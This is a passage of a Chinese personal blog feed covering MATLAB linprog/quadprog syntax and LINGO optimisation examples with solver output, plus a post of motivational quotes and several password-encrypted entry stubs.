linprog(problem)``[x,fval] = linprog(___)``[x,fval,exitflag,output] = linprog(___)``[x,fval,exitflag,output,lambda] = linprog(___)</code></p><h3 id="详细描述"><a href="#详细描述" class="headerlink" title="详细描述"></a>详细描述</h3><p><img src="https://image.hackerjerry.top/Constraint-Optimization-4.png#align=left&display=inline&height=220&margin=%5Bobject%20Object%5D&originHeight=220&originWidth=527&size=0&status=done&style=none&width=527"></p><h3 id="生产销售规划"><a href="#生产销售规划" class="headerlink" title="生产销售规划"></a>生产销售规划</h3><p>%可以直接把系数及约束条件都直接用矩阵表示而不是再写一个函数<br>c = [12 8 22-1.5/0.8 16-1.5/0.75];<br>A = [1/3 1/4 1/2.4 1/3;4 2 6/0.8 16/3;1 0 1/0.8 0];<br>b = [50;480;100];<br>v1 = [0,0,0,0];<br>[x,fval] = linprog(-c,A,b,[],[],v1);<br>对应的式子就不写了…不过在设变量的时候尽量设多一点，否则有些量之间存在因果关系的在约束的时候有可能考虑不周。<br>灵敏度分析，则 LINGO 还会输出以下结果：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs matlab">RANGES IN WHICH THE BASIS IS UNCHANGED:<br><br> OBJCOEFFICIENTRANGES  VARIABLE      CURRENT                ALLOWABLE          ALLOWABLE<br><br>                     COEF           INCREASE         DECREASE<br><br>       X1           <span class="hljs-number">72.000000</span>         <span class="hljs-number">24.000000</span>            <span class="hljs-number">8.000000</span><br><br>       X2           <span class="hljs-number">64.000000</span>          <span class="hljs-number">8.000000</span>           <span class="hljs-number">16.000000</span><br><br>                           RIGHTHANDSIDERANGES<br><br>      ROW        CURRENT        ALLOWABLE       ALLOWABLE<br><br>                     RHS            INCREASE         DECREASE<br><br>        <span class="hljs-number">2</span>            <span class="hljs-number">50.000000</span>         <span class="hljs-number">10.000000</span>          <span class="hljs-number">6.666667</span><br><br>        <span class="hljs-number">3</span>          <span class="hljs-number">480.000000</span>         <span class="hljs-number">53.333332</span>          <span class="hljs-number">80.000000</span><br><br>        <span class="hljs-number">4</span>          <span class="hljs-number">100.000000</span>         INFINITY          <span class="hljs-number">40.000000</span><br></code></pre></td></tr></table></figure><p>以上显示的是当前最优基（矩阵）保持不变的充分条件（RANGES IN WHICH THE BASIS IS UNCHANGED），包括目标函数中决策变量应的系数的变化范围（OBJ COEFFICIENT RANGES）和约束的右端项的变化范围（RIGHTHAND SIDE RANGES）两部分。<br>前一部分的输出行<br><code>X1 72.000000 24.000000 8.000000</code><br>表示决策变量 X1 当前在目标函数中对应的系数为 72，允许增加 24 和减少 8。也就是说，当该系数在区间[64，96]上变化时（假设其它条件均不变），当前最优基矩阵保持不变。对 X2 对应的输出行也可以类似地解释。由于此时约束没有任何改变，所以最优基矩阵保持不变意味着最优解不变（当然，由于目标函数中的系数发生变化，最优值还是会变的）。<br>后一部分的输出行<br><code>X2 50.000000 10.000000 6.666667</code><br>表示约束 2 当前右端项为 50，允许增加 10 和减少 6.666667。也就是说，当该系数在区间[43.333333，60]上变化时（假设其它条件均不变），当前最优基矩阵保持不变。对约束 3、约束 4 对应的输出行也可以类似地解释。由于此时约束已经改变，虽然最优基矩阵保持不变，最优解和最优值还是会变的。但是，由于最优基矩阵保持不变，所以前面的“DUAL PRICES”给出的约束的影子价格此时仍然是有效的。<br>题目的后几问是更细致的投资问题，答案使用了 Lagrange 乘子，这里我并不了解，先挖一个坑</p><h2 id="quadprog语法"><a href="#quadprog语法" class="headerlink" title="quadprog语法"></a><code>quadprog</code>语法</h2><p><code>x = quadprog(H,f)``x = quadprog(H,f,A,b)``x = quadprog(H,f,A,b,Aeq,beq)``x = quadprog(H,f,A,b,Aeq,beq,lb,ub)``x = quadprog(H,f,A,b,Aeq,beq,lb,ub,x0)</code></p><ul><li><p>H 是目标函数 Hesse 矩阵</p></li><li><p>f 是目标函数线性项系数列向量 <strong>（线性项即单变量一次项）</strong></p></li><li><p>A 是不等式约束系数矩阵（不等式都要化成<strong>左边 x 项常数</strong>）</p></li><li><p>b 是不等式约束列向量</p></li><li><p>Aeq 是等式约束系数矩阵，如</p></li><li><p>beq 是等式约束列向量</p></li><li><p>lb 是 Lower bounds, specified as a real vector or real array. If the number of elements in x0 is equal to the number of elements in lb, then lb specifies that for all i.<strong>即下界列向量</strong></p></li><li><p>ub 是<strong>上界列向量</strong></p></li></ul><p><code>x = quadprog(H,f,A,b,Aeq,beq,lb,ub,x0,options)``x = quadprog(problem)``[x,fval] = quadprog(___)``[x,fval,exitflag,output] = quadprog(___)``[x,fval,exitflag,output,lambda] = quadprog(___)</code></p><h2 id="实战–水库供水–Lingo-初探"><a href="#实战–水库供水–Lingo-初探" class="headerlink" title="实战–水库供水–Lingo 初探"></a>实战–水库供水–Lingo 初探</h2><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs matlab">model:<br>title TRanWater;<br>sets:<br>demand/<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>/:a,d;!四个小区，其实意味着a,d的范围是从<span class="hljs-number">1</span>到<span class="hljs-number">4</span><br>supply/<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>/:b;!三个供应站<br>link(supply,demand):c,x;!这个意味着c和x是二维数组，即c(<span class="hljs-built_in">i</span>,<span class="hljs-built_in">j</span>)和x(<span class="hljs-built_in">i</span>,<span class="hljs-built_in">j</span>),其中<span class="hljs-built_in">i</span>是supply的范围<span class="hljs-number">1</span>~<span class="hljs-number">3</span>，<span class="hljs-built_in">j</span>是demand范围<span class="hljs-number">1</span>~<span class="hljs-number">4</span><br>endsets<br>data:<br>!demand;<br>a = <span class="hljs-number">30</span>,<span class="hljs-number">70</span>,<span class="hljs-number">10</span>,<span class="hljs-number">10</span>;!基本用水;<br>d = <span class="hljs-number">80</span>,<span class="hljs-number">140</span>,<span class="hljs-number">30</span>,<span class="hljs-number">50</span>;!最多用水;<br>!supply;<br>b = <span class="hljs-number">100</span>,<span class="hljs-number">120</span>,<span class="hljs-number">100</span>;<span class="hljs-comment">%供应能力</span><br>c = <span class="hljs-number">160</span>,<span class="hljs-number">130</span>,<span class="hljs-number">220</span>,<span class="hljs-number">170</span><br>     <span class="hljs-number">140</span>,<span class="hljs-number">130</span>,<span class="hljs-number">190</span>,<span class="hljs-number">150</span><br>     <span class="hljs-number">190</span>,<span class="hljs-number">200</span>,<span class="hljs-number">230</span>,<span class="hljs-number">100000</span>;!管理费;<br>enddata<br>[obj]<span class="hljs-built_in">max</span> = @sum(link(<span class="hljs-built_in">i</span>,<span class="hljs-built_in">j</span>):<span class="hljs-number">450</span>*x(<span class="hljs-built_in">i</span>,<span class="hljs-built_in">j</span>)-c(<span class="hljs-built_in">i</span>,<span class="hljs-built_in">j</span>)*x(<span class="hljs-built_in">i</span>,<span class="hljs-built_in">j</span>));!没搞懂这句话！！！！！;<br>@FOR(demand(<span class="hljs-built_in">j</span>):[DEMAND_CONmin]@sum(supply(<span class="hljs-built_in">i</span>):x(<span class="hljs-built_in">i</span>,<span class="hljs-built_in">j</span>))&gt;=a(<span class="hljs-built_in">j</span>););!约束条件一<br>@FOR(demand(<span class="hljs-built_in">j</span>):[DEMAND_CONmax]@sum(supply(<span class="hljs-built_in">i</span>):x(<span class="hljs-built_in">i</span>,<span class="hljs-built_in">j</span>))&lt;=d(<span class="hljs-built_in">j</span>););<br>@FOR(supply(<span class="hljs-built_in">i</span>):[SUPPLY_CON]@sum(demand(<span class="hljs-built_in">j</span>):x(<span class="hljs-built_in">i</span>,<span class="hljs-built_in">j</span>))&lt;=b(<span class="hljs-built_in">i</span>););<br><span class="hljs-keyword">end</span><br>输出<br>Global optimal solution found.<br>Objective value:                              <span class="hljs-number">88700.00</span><br>X( <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)        <span class="hljs-number">0.000000</span>            <span class="hljs-number">20.00000</span><br>X( <span class="hljs-number">1</span>, <span class="hljs-number">2</span>)        <span class="hljs-number">100.0000</span>            <span class="hljs-number">0.000000</span><br>X( <span class="hljs-number">1</span>, <span class="hljs-number">3</span>)        <span class="hljs-number">0.000000</span>            <span class="hljs-number">40.00000</span><br>X( <span class="hljs-number">1</span>, <span class="hljs-number">4</span>)        <span class="hljs-number">0.000000</span>            <span class="hljs-number">20.00000</span><br>X( <span class="hljs-number">2</span>, <span class="hljs-number">1</span>)        <span class="hljs-number">30.00000</span>            <span class="hljs-number">0.000000</span><br>X( <span class="hljs-number">2</span>, <span class="hljs-number">2</span>)        <span class="hljs-number">40.00000</span>            <span class="hljs-number">0.000000</span><br>X( <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)        <span class="hljs-number">0.000000</span>            <span class="hljs-number">10.00000</span><br>X( <span class="hljs-number">2</span>, <span class="hljs-number">4</span>)        <span class="hljs-number">50.00000</span>            <span class="hljs-number">0.000000</span><br>X( <span class="hljs-number">3</span>, <span class="hljs-number">1</span>)        <span class="hljs-number">50.00000</span>            <span class="hljs-number">0.000000</span><br>X( <span class="hljs-number">3</span>, <span class="hljs-number">2</span>)        <span class="hljs-number">0.000000</span>            <span class="hljs-number">20.00000</span><br>X( <span class="hljs-number">3</span>, <span class="hljs-number">3</span>)        <span class="hljs-number">30.00000</span>            <span class="hljs-number">0.000000</span><br>X( <span class="hljs-number">3</span>, <span class="hljs-number">4</span>)        <span class="hljs-number">0.000000</span>            <span class="hljs-number">99800.004444</span><br></code></pre></td></tr></table></figure><h2 id="实战-2–圈地模型"><a href="#实战-2–圈地模型" class="headerlink" title="实战 2–圈地模型"></a>实战 2–圈地模型</h2><p>果然 lingo 求解多变量线性规划简单。</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs matlab">model:<br>Max = <span class="hljs-number">0.09</span>*(L1*L2+L3*L4);<br><span class="hljs-number">0.09</span>*L1*L2&gt;=<span class="hljs-number">1000</span>;<br><span class="hljs-number">0.09</span>*L3*L4&gt;=<span class="hljs-number">1000</span>;<br>h1&gt;=<span class="hljs-number">20</span>;<br>h2&gt;=<span class="hljs-number">20</span>;<br><span class="hljs-number">2</span>*(h1*L1+h1*L2+h2*L3+h2*L4)&lt;=<span class="hljs-number">100000</span>;<br><span class="hljs-keyword">end</span><br>完全直译即可。输出<br>Variable           Value        Reduced Cost<br>L1        <span class="hljs-number">1144.591</span>            <span class="hljs-number">0.000000</span><br>L2        <span class="hljs-number">1144.591</span>            <span class="hljs-number">0.000000</span><br>L3        <span class="hljs-number">105.4093</span>            <span class="hljs-number">0.000000</span><br>L4        <span class="hljs-number">105.4093</span>            <span class="hljs-number">0.000000</span><br>H1        <span class="hljs-number">20.00000</span>            <span class="hljs-number">0.000000</span><br>H2        <span class="hljs-number">20.00000</span>            <span class="hljs-number">0.000000</span><br><br>Row    Slack or Surplus      Dual Price<br><span class="hljs-number">1</span>        <span class="hljs-number">118907.9</span>            <span class="hljs-number">1.000000</span><br><span class="hljs-number">2</span>        <span class="hljs-number">116907.9</span>            <span class="hljs-number">0.000000</span><br><span class="hljs-number">3</span>        <span class="hljs-number">0.000000</span>           <span class="hljs-number">-9.858541</span><br><span class="hljs-number">4</span>        <span class="hljs-number">0.000000</span>           <span class="hljs-number">-11790.79</span><br><span class="hljs-number">5</span>        <span class="hljs-number">0.000000</span>           <span class="hljs-number">-1085.854</span><br><span class="hljs-number">6</span>        <span class="hljs-number">0.000000</span>            <span class="hljs-number">2.575329</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数学建模</category>
      
    </categories>
    
    
    <tags>
      
      <tag>约束优化</tag>
      
      <tag>lingo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Experience-in-Mathematical-Modeling</title>
    <link href="/2020/09/10/Experience-in-Mathematical-Modeling_new/"/>
    <url>/2020/09/10/Experience-in-Mathematical-Modeling_new/</url>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="52f72c86c31c76c8e2d3180930d69a8f1bda25ac5a72905d321562d351aac231"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>数学建模</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数模经验</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FAQ-and-their-solutions</title>
    <link href="/2020/09/09/FAQ-and-their-solutions_new/"/>
    <url>/2020/09/09/FAQ-and-their-solutions_new/</url>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="f4856c28fbb397dea87699c8ed59598d7e820a5dd375420567852a2c7e3d6b9d"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>数学建模</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数模</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Sklearn-Draws-in-authority-Examples</title>
    <link href="/2020/09/08/Sklearn-Draws-in-authority-Examples_new/"/>
    <url>/2020/09/08/Sklearn-Draws-in-authority-Examples_new/</url>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="8b7329643017fda12b67471cfec5944e688b23a8b3ace4a5071730208458dbc5"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>绘图</tag>
      
      <tag>sklearn</tag>
      
      <tag>评价指标</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Beautiful-Powerful-Sentences</title>
    <link href="/2020/09/08/Beautiful-Powerful-Sentences_new/"/>
    <url>/2020/09/08/Beautiful-Powerful-Sentences_new/</url>
    
    <content type="html"><![CDATA[<a id="more"></a><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>从现在起，我开始谨慎地选择我的生活，<br>我不再轻易让自己迷失在各种诱惑里。<br>我心中已经听到来自远方的呼唤，<br>再不需要回过头去关心身后的种种是非与议论。<br>我已无暇顾及过去，我要向前走。</p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>人最终决定着自己的命运。<br>在天赋和环境内，他成为什么是自己决定的结果。<br>人不是简单的活着，而是时时需求对自己的前途做出思考，<br>决定下一刻自己会成为什么样的人。<br>每个人都有随时改变自己决定的自由。</p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p>其实你今天经历的，并无特例，所有人都曾经历过。<br>今天的马云、李彦宏、俞敏洪都曾是和你一样的青年，<br>站在人生路口，困惑、孤独，但是充满梦想与希望。<br>不要让害怕本身阻碍了你前进的步伐，不要放大自己的弱点。</p><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p>你不必非常出色，只要在很长，很长的时间内保持比别人聪明一点点就够了。<br>–芒格</p><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p>《乌合之众》中有一个观点：“群体不善于推理，却急于采取行动。”<br>前几天的西外喊楼事件，确实，校方做法让学生忍无可忍，但随即西安众多二本院校相继“暴乱”，引以为傲谓之“起义”，谬也，谬也。</p><h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><p><img src="https://image.hackerjerry.top/Beautiful-Powerful-Sentences-1.png#align=left&display=inline&height=544&margin=%5Bobject%20Object%5D&name=image.png&originHeight=680&originWidth=350&size=239725&status=done&style=none&width=280" alt="image.png"></p><h3 id="7"><a href="#7" class="headerlink" title="7"></a>7</h3><p>有一个原则你们一定要记住，因为兴趣和感情相聚的人，最好不要牵扯利益；因为利益相识的人，最好也不要谈感情。</p><h3 id="8"><a href="#8" class="headerlink" title="8"></a>8</h3><p>《琅琊榜》里萧景睿说过一句话：“我之所以这么待你，是因为我愿意。若能以此换回同样的诚心，固然可喜。若是没有，我也没有什么可后悔的。”<br>你觉得别人应该对你的善意抱有感动，大概是因为你的善意感动了自己，也希望它能感动别人。可是当它并不能感动到别人的时候，也不需要太难过，毕竟它还是感动着你自己。 善意的累积，必定会换到真心，就算不能，也一定会让你心里熨贴，交到知己。<br>–转自知乎</p><h3 id="9"><a href="#9" class="headerlink" title="9"></a>9</h3><p>你要知道什么是自己想要的，知道什么是不可逆转的，知道用什么方式实现梦想，知道用什么心情面对苦难。</p><p>人就在转瞬之间感悟，进退得失，不离不弃也就都有了答案。</p><p>我不知道命运会把我带向何方，<br>但是我一直会用善良维护左右。</p><h3 id="10"><a href="#10" class="headerlink" title="10"></a>10</h3><p>我愿探索不同的视角，<br>永远追逐善良，美好和爱</p><h3 id="11"><a href="#11" class="headerlink" title="11"></a>11</h3><p>生活虽然可能荆棘满地，但仍然不能阻止你一路高歌。</p><h3 id="12"><a href="#12" class="headerlink" title="12"></a>12</h3><p>愿你我一路繁花似锦，山水相拥，青山为伴。</p><h3 id="13"><a href="#13" class="headerlink" title="13"></a>13</h3><p>把酒祝东风，且共从容。</p><h3 id="14"><a href="#14" class="headerlink" title="14"></a>14</h3><p>纵身跃入岁月的长河，从中去寻找自己的意义。</p><h3 id="15"><a href="#15" class="headerlink" title="15"></a>15</h3><p>所有人都祝你快乐，我只愿你，遍历山河，觉得人间值得。</p><h3 id="16"><a href="#16" class="headerlink" title="16"></a>16</h3><p>月色微醺，比是比不过太阳。<br>不过，<br>只要照得亮前路。就耽误不了你的行程。</p><h3 id="17"><a href="#17" class="headerlink" title="17"></a>17</h3><p>春水碧于天，画船听雨眠。</p><h3 id="18"><a href="#18" class="headerlink" title="18"></a>18</h3><p>那些真正喜欢的人和事，都值得我们去坚持。</p><h3 id="19"><a href="#19" class="headerlink" title="19"></a>19</h3><p>今夕何夕，见此良人。</p><h3 id="20"><a href="#20" class="headerlink" title="20"></a>20</h3><p>即使是为了专门的目的读书，也要在读书时抛掉其他功利性的想法，沉浸于获得知识的愉悦中。因为结果我们无法决定，但是过程中获得的知识与体验是肯定的。</p><h3 id="21"><a href="#21" class="headerlink" title="21"></a>21</h3><p>在这条路上行走过的足迹，那些坚持梦想为梦想而呼吸的曾经，探索的光芒永远印刻在心里，变成一种理想温暖依旧永垂不朽。</p>]]></content>
    
    
    <categories>
      
      <category>文艺</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文艺</tag>
      
      <tag>句子</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Summary-of-common-python-operations-2</title>
    <link href="/2020/09/08/Summary-of-common-python-operations-2_new/"/>
    <url>/2020/09/08/Summary-of-common-python-operations-2_new/</url>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="759e486a2d716150ca1143c22364d3b938bf6f6037f1f2729fac99fbed629d01"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>数学建模</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数模</tag>
      
      <tag>python</tag>
      
      <tag>绘图</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python-draw-map</title>
    <link href="/2020/09/06/python-draw-map_new/"/>
    <url>/2020/09/06/python-draw-map_new/</url>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="相关示例"><a href="#相关示例" class="headerlink" title="相关示例"></a>相关示例</h1><p><a href="https://blog.csdn.net/weixin_43820992/article/details/86725737?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-6.channel_param&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-6.channel_param">地图代码</a><br><a href="https://www.analyticsvidhya.com/blog/2020/06/guide-geospatial-analysis-folium-python/">时间热力图</a><br>官方示例 <a href="https://nbviewer.jupyter.org/github/python-visualization/folium/blob/master/examples/Heatmap.ipynb">https://nbviewer.jupyter.org/github/python-visualization/folium/blob/master/examples/Heatmap.ipynb</a></p><h1 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h1><p><a href="http://datav.aliyun.com/tools/atlas/#%E2%AA%AB=31.80289258670676&lng=104.2822265625&zoom=4">http://datav.aliyun.com/tools/atlas/#⪫=31.80289258670676&amp;lng=104.2822265625&amp;zoom=4</a><br>直接下载</p>]]></content>
    
    
    <categories>
      
      <category>绘图</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>地图</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Algorithms-of-codes-in-Mathematical-Modeling</title>
    <link href="/2020/09/03/Algorithms-of-codes-in-Mathematical-Modeling_new/"/>
    <url>/2020/09/03/Algorithms-of-codes-in-Mathematical-Modeling_new/</url>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="d0a397ac2a565968082ce45ded20d801775de9bb1bd9e2f75962b3ecebcf5aea">c6ba4c3fd4c93b9e41d59aea4e65d605e5a5ce01a719b9cf45b5f7c7c2df20864dbd5dbd2a156ba1fd3dc9fb6b243e59f131d183193234b3db62ba051f735b7b08231ff3a229cf6862942ee8120b2295d384e2438008f3844bc59821933e4fd5f19373bd93bcabf3cd9e3c5be25295702b029ecfcc1db7d05300036ee8ea51d1c2109f02fa1181fd3f6186ce3a472768e2889ae5be1cf2c469890e90f084602f50f3c3f49061e5614bf64c9eddb8a0f80c33214d60d04da49ee35d6dba4dbc7c1ac6f3e0cac7870e1ac19155d3a2bb3d31ca0de1b2a1b3d9ab67ef56e109a0e9d50e13f848ed8565a2ccfe412586fc4025bd5573184b4ab97efc426f98fb32c5cf3bc3377ac3f5b3e2290da150343a277ad7c7019ee4667e7a0bc6c9828c03a655237118d1c2d86e442c900bbf6d7140285088162aca798976b6f9d9e6a51f56024b119fa01068b9a40e06637bd0579c7052f8e6f7d6eaa9e0692619604cb6623d6846348e6209bbe805ab13708851b03382e73b74c86d9367e2e6183143993b01102bd1dc2bfb5c1e8b07559d12f3009a7c3f18967a60d31098736e2d56493ca4ae1839aeec43cfde835646e9e0b9ac0cd87f46bc73ac14c9f3c29b2088388e4b20dd2252aa5ac843013caaa968114ee50ee5f9cf11d7106f69aabd2e08b3c156ece43d8bb183c1cfa392b3d00ed9d7486a7676d9e9c58d2e124d21d7dce33620462049efaa79fc84a4809d2ded113cba1244f83a865fde61738951713b9835733e7b521be88451e51053914367c796705fc4e0721f0bf0af79b44fe5a5f188d4c30d192af6ef95cfd3989862ac03505cd09f64d9aca1c0407609a4dbea208021fc60ac92626186e549cd23564c103ffa667e79871b5a012ecccc7385b297d69fc8478b25458b3ac70e81a89791ce64fd97a1f0758a1f0b352284d8c99b0d5fc6d17f7cbfec448401ccab80a3f874eb78f731fbe220c571dd0656f91b3123e4e48ad3dc671c0b6aa184e2bf6b4760cf55b1ff2da03aeea88a009db29fe7c60b9ac8195955e3ad63ec08eb2f3ea9c87bd181b66e603f16edad73d00e7973abf6179860df1546657c67f940bbd1b52834596ce89e04b2182a3c0e9cc7e1b4ed2e994070356b5cb7bef4c0be3032ee0e8e72e739260f4e8a3384a08db81e323b16cc75fba1207c60e2d91774187e2cf47a036fd5dffee1ba6d20f59af08d6bc8a1939e66adea554e70a5b0985981cb9d20295761635b9480d7972aa16a26087cb586a61ff63dcb00d92f88298c7b4fcab8df71f7e8105bb7790364db8fbeae03a4d321695dd6e79bb5ca56788e5d6b61cde2a40b2af28fa644db0e12578c1705a44a93f2f9e9ac1de2d7cc55ee5de16a6540284282478eaef3920b3600a2afbf9be4cc92bdf708ccb4592e1afe8cbfdfaebdae4cb18148231cdb6b5c9e41fe92962fd34a9fdf112027e0f030f582ab6aa62004472bd902fe9a6203e30ab52dd5f8403b366e3737f20b4e8c097a2fbcbba84a3e6b372f3168a9b2f995b094076ee079ac5f61a77d50056f7447f706cca2fa2e40f33680435276c1dcdd01375807d089e9dc2cbb6e11eaa3ddd15914db5193d6326ae31d92bf0f4cad68e040f157d3c0b453c7ce27c465632c105184f7c820a9320bbf445c0c37edf869cdba226d84a159f2f57db88b1645caebcea3a7e7f1f81e5ce7d206e999f928595cdda841e305def9e5ba84429d3e2dd7a740ea63a48515a8d833c677922f43acab264e2524006863ca0d21daf035a99d82471212f2dcd6757f1d571f91b2be4a60c727e400ce0b9a92d6e2397546d125ccbcba67554686e38b2bafb8f1d1e60fa996123619560edf81dc73ccd824365743f198cca9827d6a164b5835de4d9505a58fe4e658a8b579b4aea49c22cdf7f45c4bd2a9f7d12242705dcfc26c0b42aed4a6aa6228765c931ed5fa65a7a29138fa06f8f0246dcb4b53eb63c8736a42fd3d93aeec4eb9c11522ab15720b33334c96b449a87da9f77cfcd5a584a42edbf8782d28a6a727af50c10de7c402bf64f8869961b72cf2e3181b2e5f299703ef3fa7f398fdea53ceda834c781199644b1035881165af569a68e89f760dd2ddef338cd38f965ac711e11727c1cef164eac1b6ee9a51637759d10a4632b9e0bf05ac2acbbd61d2b088bf89d232e606433ba6c4cd1fa79e2e226b5307ab04531873fa666328c9f354502b8ec2138c0c00b7804788057ddb509bf0650471e7c7191d771bffae6063c2b68d6a841aafaad2925805bd608e7342e2993c026a099b7275d69ced0c891c41db0c400016e68c75d7bd40a2b7effd126acc78797bc392dd449f5436acb047455b02a9f08528e1db82c46defbc9dbc568eb7b24dac2b4d3da4a2ac576c9eae0cf26e078ff9951538c1c2ed45ed2e8b6caf2de971ef7035bac7d08b04b594feb33a7b9112d8c23f72a2c0252bedc0a9acc9b3996b5ad6e3a5fb5aa36b505ab89207245e281ad8bddb9654666a15b8c67ca642f6aa41e3c81091c1b02e0826cea07e991bb15507e88b530ad84e4303657c1bb88f69a73e0358c869adfa981d151b309919236844ca9414280e850db675b91e3da291a2051eda0614cab743dcc623c8da7d55835f9652bc58b3ee133d979e54e38183a82ce966bf66aa8be5914decc3b9ecb22e598fbc369cf1eb19851b31daffdceb462a6b987bf75a2b0bcd8615d5ac5613c0a8c75335acca8485395a9298a5eccd6d82d149120a85546b367c2cd1ffff8fec0fa27bfb83c654544e997b739940d6fb03c75ddef3c152649bc757863e465a4ae864905a293781c2cc25d1cbeee0bf9cc3ea04bf893a6b12f42c6397b3acf0688f0821422645ea871dc9207c65f911b6fd54e39717a1d70666b35edf4c3cdf63e7612d7684b06dbbc3d4cb3d805822002c41e0a95a78a62a278d3ace998249b38d59fc6747fd9defce8a8a3c29b60a2e7ce3c3dabc341b4f4f3d9c34330d8b12300b585b6cf565118bd154abd54093eb